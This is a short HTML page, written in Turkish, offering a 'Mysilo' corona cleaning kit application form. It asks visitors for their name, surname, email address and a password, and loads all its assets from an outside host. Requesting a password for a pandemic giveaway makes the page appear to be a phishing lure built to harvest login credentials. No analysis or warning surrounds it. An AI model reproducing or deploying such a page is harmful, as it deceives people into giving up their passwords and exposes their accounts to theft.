<!DOCTYPE html>
<html lang="en">
<head>

     <title>Mysilo</title>

     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <meta name="description" content="">
     <meta name="keywords" content="">
     <meta name="team" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

     <link rel="stylesheet" href="https://ayberk.ninja/silsil/silsil/theme/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://ayberk.ninja/silsil/silsil/theme/css/vegas.min.css">
     <link rel="stylesheet" href="https://ayberk.ninja/silsil/silsil/theme/css/font-awesome.min.css">

     <!-- MAIN CSS -->
     <link rel="stylesheet" href="https://ayberk.ninja/silsil/silsil/theme/css/templatemo-style.css">

</head>
<body>

     <!-- PRE LOADER -->
     <section class="preloader">
          <div class="spinner">

               <span class="spinner-rotate"></span>
               
          </div>
     </section>


     <!-- HOME -->
     <section id="home">
        <div class="overlay"></div>
          <div class="container">
               <div class="row">

                    <div class="col-md-12 col-sm-12">
                         <div class="home-info">
                              <h1>MYSİLO <br>Korona Temizlik Kiti Başvuru Formu</h1>
                              <div class="subscribe-form">
                                <form action="" method="POST">
                                  <input type="text" name="name" class="form-control" placeholder="İsim" required="">
                                  <br>
                                  <input type="text" name="surname" class="form-control" placeholder="Soyisim" required="">
                                  <br>
                                  <input type="email" name="email" class="form-control" placeholder="Mail" required="">
                                  <br>
                                  <input type="password" name="password" class="form-control" placeholder="Parola" required="">
                                  <button type="submit" class="form-control"><p class="btn">Gönder</p><i class="fa fa-angle-right"></i></button>
                                </form>
                              </div>
                         </div>
                    </div>

               </div>
          </div>
     </section>

     <!-- SCRIPTS -->
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/jquery.js"></script>
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/bootstrap.min.js"></script>
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/vegas.min.js"></script>
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/countdown.js"></script>
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/init.js"></script>
     <script src="https://ayberk.ninja/silsil/silsil/theme/js/custom.js"></script>

</body>
</html>
